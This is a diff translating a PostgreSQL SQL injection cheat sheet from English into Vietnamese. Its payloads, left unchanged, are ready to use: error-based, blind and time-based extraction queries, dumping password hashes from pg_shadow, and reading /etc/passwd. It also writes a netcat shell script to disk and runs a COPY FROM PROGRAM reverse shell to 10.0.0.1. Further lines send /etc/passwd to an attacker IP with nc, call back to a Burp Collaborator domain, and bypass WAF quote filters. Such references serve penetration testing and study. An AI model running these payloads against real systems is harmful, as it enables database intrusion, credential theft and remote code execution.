@@ -1,69 +1,69 @@
 # PostgreSQL Injection
 
-> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.
+> PostgreSQL SQL injection đề cập đến một loại lỗ hổng bảo mật, trong đó kẻ tấn công khai thác dữ liệu đầu vào của người dùng không được kiểm tra, làm sạch đúng cách để thực thi các lệnh SQL trái phép trong cơ sở dữ liệu PostgreSQL.
 
-## Summary
+## Tóm tắt
 
-* [PostgreSQL Comments](#postgresql-comments)
-* [PostgreSQL Enumeration](#postgresql-enumeration)
-* [PostgreSQL Methodology](#postgresql-methodology)
-* [PostgreSQL Error Based](#postgresql-error-based)
-    * [PostgreSQL XML Helpers](#postgresql-xml-helpers)
-* [PostgreSQL Blind](#postgresql-blind)
-    * [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)
-* [PostgreSQL Time Based](#postgresql-time-based)
+* [Chú thích trong PostgreSQL](#postgresql-comments)
+* [Liệt kê thông tin PostgreSQL](#postgresql-enumeration)
+* [Phương pháp khai thác PostgreSQL](#postgresql-methodology)
+* [Khai thác dựa trên lỗi PostgreSQL](#postgresql-error-based)
+    * [Các hàm hỗ trợ XML của PostgreSQL](#postgresql-xml-helpers)
+* [Khai thác dạng mù (Blind) PostgreSQL](#postgresql-blind)
+    * [Khai thác mù của PostgreSQL tương đương với Substring](#postgresql-blind-with-substring-equivalent)
+* [Khai thác dựa trên thời gian PostgreSQL](#postgresql-time-based)
 * [PostgreSQL Out of Band](#postgresql-out-of-band)
-* [PostgreSQL Stacked Query](#postgresql-stacked-query)
-* [PostgreSQL File Manipulation](#postgresql-file-manipulation)
-    * [PostgreSQL File Read](#postgresql-file-read)
-    * [PostgreSQL File Write](#postgresql-file-write)
-* [PostgreSQL Command Execution](#postgresql-command-execution)
-    * [Using COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
-    * [Using libc.so.6](#using-libcso6)
-* [PostgreSQL WAF Bypass](#postgresql-waf-bypass)
-    * [Alternative to Quotes](#alternative-to-quotes)
-* [PostgreSQL Privileges](#postgresql-privileges)
-    * [PostgreSQL List Privileges](#postgresql-list-privileges)
-    * [PostgreSQL Superuser Role](#postgresql-superuser-role)
-* [References](#references)
+* [Truy vấn xếp chồng (Stacked Query) PostgreSQL](#postgresql-stacked-query)
+* [Thao tác tập tin PostgreSQL](#postgresql-file-manipulation)
+    * [Đọc tập tin PostgreSQL](#postgresql-file-read)
+    * [Ghi tập tin PostgreSQL](#postgresql-file-write)
+* [Thực thi lệnh trên PostgreSQL](#postgresql-command-execution)
+    * [Dùng COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
+    * [Dùng libc.so.6](#using-libcso6)
+* [Vượt qua WAF trên PostgreSQL](#postgresql-waf-bypass)
+    * [Phương án thay thế cho dấu nháy](#alternative-to-quotes)
+* [Quyền hạn trong PostgreSQL](#postgresql-privileges)
+    * [Liệt kê quyền hạn PostgreSQL](#postgresql-list-privileges)
+    * [Vai trò Superuser trong PostgreSQL](#postgresql-superuser-role)
+* [Tài liệu tham khảo](#references)
 
-## PostgreSQL Comments
+## Chú thích trong PostgreSQL
 
-| Type                | Comment |
-| ------------------- | ------- |
-| Single-Line Comment | `--`    |
-| Multi-Line Comment  | `/**/`  |
+| Loại                    | Chú thích |
+| ------------------------ | --------- |
+| Chú thích một dòng       | `--`      |
+| Chú thích nhiều dòng     | `/**/`    |
 
-## PostgreSQL Enumeration
+## Liệt kê thông tin PostgreSQL
 
-| Description            | SQL Query                                            |
-| ---------------------- | ---------------------------------------------------- |
-| DBMS version           | `SELECT version()`                                   |
-| Database Name          | `SELECT CURRENT_DATABASE()`                          |
-| Database Schema        | `SELECT CURRENT_SCHEMA()`                            |
-| List PostgreSQL Users  | `SELECT usename FROM pg_user`                        |
-| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow`              |
-| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
-| Current User           | `SELECT user;`                                       |
-| Current User           | `SELECT current_user;`                               |
-| Current User           | `SELECT session_user;`                               |
-| Current User           | `SELECT usename FROM pg_user;`                       |
-| Current User           | `SELECT getpgusername();`                            |
+| Mô tả                        | Câu truy vấn SQL                                     |
+| ------------------------------ | -------------------------------------------------------- |
+| Phiên bản DBMS                 | `SELECT version()`                                       |
+| Tên cơ sở dữ liệu               | `SELECT CURRENT_DATABASE()`                              |
+| Schema cơ sở dữ liệu            | `SELECT CURRENT_SCHEMA()`                                |
+| Liệt kê người dùng PostgreSQL   | `SELECT usename FROM pg_user`                            |
+| Liệt kê hash mật khẩu           | `SELECT usename, passwd FROM pg_shadow`                  |
+| Liệt kê quản trị viên DB        | `SELECT usename FROM pg_user WHERE usesuper IS TRUE`     |
+| Người dùng hiện tại             | `SELECT user;`                                           |
+| Người dùng hiện tại             | `SELECT current_user;`                                   |
+| Người dùng hiện tại             | `SELECT session_user;`                                   |
+| Người dùng hiện tại             | `SELECT usename FROM pg_user;`                           |
+| Người dùng hiện tại             | `SELECT getpgusername();`                                |
 
-## PostgreSQL Methodology
+## Phương pháp khai thác PostgreSQL
 
-| Description    | SQL Query                                                                             |
-| -------------- | ------------------------------------------------------------------------------------- |
-| List Schemas   | `SELECT DISTINCT(schemaname) FROM pg_tables`                                          |
-| List Databases | `SELECT datname FROM pg_database`                                                     |
-| List Tables    | `SELECT table_name FROM information_schema.tables`                                    |
-| List Tables    | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
-| List Tables    | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`                  |
-| List Columns   | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`    |
+| Mô tả                | Câu truy vấn SQL                                                                        |
+| ---------------------- | ------------------------------------------------------------------------------------------ |
+| Liệt kê Schema         | `SELECT DISTINCT(schemaname) FROM pg_tables`                                              |
+| Liệt kê cơ sở dữ liệu  | `SELECT datname FROM pg_database`                                                          |
+| Liệt kê bảng           | `SELECT table_name FROM information_schema.tables`                                        |
+| Liệt kê bảng           | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'`     |
+| Liệt kê bảng           | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`                       |
+| Liệt kê cột            | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`        |
 
-## PostgreSQL Error Based
+## Khai thác dựa trên lỗi PostgreSQL
 
-| Name | Payload                                                                 |
+| Tên  | Payload                                                                  |
 | ---- | ----------------------------------------------------------------------- |
 | CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
 | CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -`    |
@@ -84,41 +84,41 @@ CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||
 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
 ```
 
-### PostgreSQL XML Helpers
+### Các hàm hỗ trợ XML của PostgreSQL
 
 ```sql
 SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
 ```
 
-The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.
+Hàm `query_to_xml` ở trên trả về tất cả kết quả của câu truy vấn được chỉ định dưới dạng một kết quả duy nhất. Kết hợp kỹ thuật này với [khai thác dựa trên lỗi PostgreSQL](#postgresql-error-based) để trích xuất dữ liệu mà không cần phải lo lắng về việc giới hạn (`LIMIT`) truy vấn chỉ trả về một kết quả.
 
 ```sql
 SELECT database_to_xml(true,true,''); -- dump the current database to XML
 SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
 ```
 
-Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.
+Lưu ý, với các truy vấn trên, kết quả đầu ra cần được tổng hợp trong bộ nhớ. Đối với các cơ sở dữ liệu lớn hơn, điều này có thể gây ra tình trạng chậm hoặc dẫn đến từ chối dịch vụ (denial of service).
 
-## PostgreSQL Blind
+## Khai thác dạng mù (Blind) PostgreSQL
 
-### PostgreSQL Blind With Substring Equivalent
+### Khai thác mù của PostgreSQL tương đương với Substring
 
-| Function    | Example                                         |
+| Hàm         | Ví dụ                                            |
 | ----------- | ----------------------------------------------- |
 | `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
 | `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
 | `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |
 
-Examples:
+Ví dụ:
 
 ```sql
 ' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
 ' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
 ```
 
-## PostgreSQL Time Based
+## Khai thác dựa trên thời gian PostgreSQL
 
-### Identify Time Based
+### Nhận diện khai thác dựa trên thời gian
 
 ```sql
 select 1 from pg_sleep(5)
@@ -126,19 +126,19 @@ select 1 from pg_sleep(5)
 ||(select 1 from pg_sleep(5))
 ```
 
-### Database Dump Time Based
+### Trích xuất cơ sở dữ liệu dựa trên thời gian
 
 ```sql
 select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
 ```
 
-### Table Dump Time Based
+### Trích xuất bảng dựa trên thời gian
 
 ```sql
 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
 ```
 
-### Columns Dump Time Based
+### Trích xuất cột dựa trên thời gian
 
 ```sql
 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
@@ -153,7 +153,7 @@ AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 
 ## PostgreSQL Out of Band
 
-Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept.
+Các cuộc tấn công SQL injection dạng out-of-band trong PostgreSQL dựa vào việc sử dụng các hàm có thể tương tác với hệ thống tập tin hoặc mạng, chẳng hạn như `COPY`, `lo_export`, hoặc các hàm từ các extension có thể thực hiện các hành động mạng. Ý tưởng là khai thác cơ sở dữ liệu để gửi dữ liệu đến nơi khác, mà kẻ tấn công có thể giám sát và chặn lại.
 
 ```sql
 declare c text;
@@ -167,28 +167,28 @@ $$ language plpgsql security definer;
 SELECT f();
 ```
 
-## PostgreSQL Stacked Query
+## Truy vấn xếp chồng (Stacked Query) PostgreSQL
 
-Use a semi-colon "`;`" to add another query
+Dùng dấu chấm phẩy "`;`" để thêm một truy vấn khác
 
 ```sql
 SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
 ```
 
-## PostgreSQL File Manipulation
+## Thao tác tập tin PostgreSQL
 
-### PostgreSQL File Read
+### Đọc tập tin PostgreSQL
 
-NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.
+LƯU Ý: Các phiên bản Postgres trước đây không chấp nhận đường dẫn tuyệt đối trong `pg_read_file` hoặc `pg_ls_dir`. Các phiên bản mới hơn (kể từ commit [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)) sẽ cho phép đọc bất kỳ tập tin/đường dẫn tập tin nào đối với superuser hoặc người dùng thuộc nhóm `default_role_read_server_files`.
 
-* Using `pg_read_file`, `pg_ls_dir`
+* Dùng `pg_read_file`, `pg_ls_dir`
 
     ```sql
     select pg_ls_dir('./');
     select pg_read_file('PG_VERSION', 0, 200);
     ```
 
-* Using `COPY`
+* Dùng `COPY`
 
     ```sql
     CREATE TABLE temp(t TEXT);
@@ -196,7 +196,7 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     SELECT * FROM temp limit 1 offset 0;
     ```
 
-* Using `lo_import`
+* Dùng `lo_import`
 
     ```sql
     SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
@@ -204,9 +204,9 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     SELECT * from pg_largeobject; -- or just get all the large objects and their data
     ```
 
-### PostgreSQL File Write
+### Ghi tập tin PostgreSQL
 
-* Using `COPY`
+* Dùng `COPY`
 
     ```sql
     CREATE TABLE nc (t TEXT);
@@ -215,13 +215,13 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     COPY nc(t) TO '/tmp/nc.sh';
     ```
 
-* Using `COPY` (one-line)
+* Dùng `COPY` (một dòng)
 
     ```sql
     COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
     ```
 
-* Using `lo_from_bytea`, `lo_put` and `lo_export`
+* Dùng `lo_from_bytea`, `lo_put` và `lo_export`
 
     ```sql
     SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
@@ -229,11 +229,11 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
     ```
 
-## PostgreSQL Command Execution
+## Thực thi lệnh trên PostgreSQL
 
-### Using COPY TO/FROM PROGRAM
+### Dùng COPY TO/FROM PROGRAM
 
-Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.
+Các bản cài đặt chạy Postgres 9.3 trở lên có chức năng cho phép superuser và người dùng có quyền '`pg_execute_server_program`' thực hiện việc pipe đến và từ một chương trình bên ngoài bằng cách dùng `COPY`.
 
 ```sql
 COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
@@ -245,35 +245,35 @@ CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
 ```
 
-### Using libc.so.6
+### Dùng libc.so.6
 
 ```sql
 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
 SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 ```
 
-## PostgreSQL WAF Bypass
+## Vượt qua WAF trên PostgreSQL
 
-### Alternative to Quotes
+### Phương án thay thế cho dấu nháy
 
-PostgreSQL offers several ways to construct string values without using standard single-quoted literals. The `CHR()` function can generate individual characters from their numeric character codes, which can then be combined using the concatenation operator (`||`). PostgreSQL also supports dollar-quoted strings, available since version 8, allowing text to be enclosed between `$$` delimiters without escaping embedded single quotes.
+PostgreSQL cung cấp một số cách để tạo ra các giá trị chuỗi mà không cần dùng đến ký tự chuỗi nháy đơn tiêu chuẩn. Hàm `CHR()` có thể tạo ra các ký tự riêng lẻ từ mã số của chúng, sau đó có thể được ghép lại bằng toán tử nối chuỗi (`||`). PostgreSQL cũng hỗ trợ chuỗi được đánh dấu bằng ký hiệu đô la (dollar-quoted string), có từ phiên bản 8, cho phép văn bản được đặt giữa các dấu phân cách `$$` mà không cần escape các dấu nháy đơn bên trong.
 
-| Payload                                 | Technique                                       |
-| --------------------------------------- | ----------------------------------------------- |
-| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()`                             |
-| `SELECT $$NoQuote$$`                    | Dollar-Quoted String ( >= version 8 PostgreSQL) |
+| Payload                                 | Kỹ thuật                                          |
+| --------------------------------------- | ---------------------------------------------------- |
+| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | Chuỗi từ `CHR()`                                     |
+| `SELECT $$NoQuote$$`                    | Chuỗi đánh dấu bằng ký hiệu đô la (từ PostgreSQL >= 8) |
 
-## PostgreSQL Privileges
+## Quyền hạn trong PostgreSQL
 
-### PostgreSQL List Privileges
+### Liệt kê quyền hạn PostgreSQL
 
-Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.
+Lấy tất cả các quyền cấp bảng của người dùng hiện tại, loại trừ các bảng nằm trong các schema hệ thống như `pg_catalog` và `information_schema`.
 
 ```sql
 SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
 ```
 
-### PostgreSQL Superuser Role
+### Vai trò Superuser trong PostgreSQL
 
 ```sql
 SHOW is_superuser; 
@@ -281,7 +281,7 @@ SELECT current_setting('is_superuser');
 SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
 ```
 
-## References
+## Tài liệu tham khảo
 
 * [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://web.archive.org/web/20250812102408/https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
 * [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://web.archive.org/web/20200927000909/https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
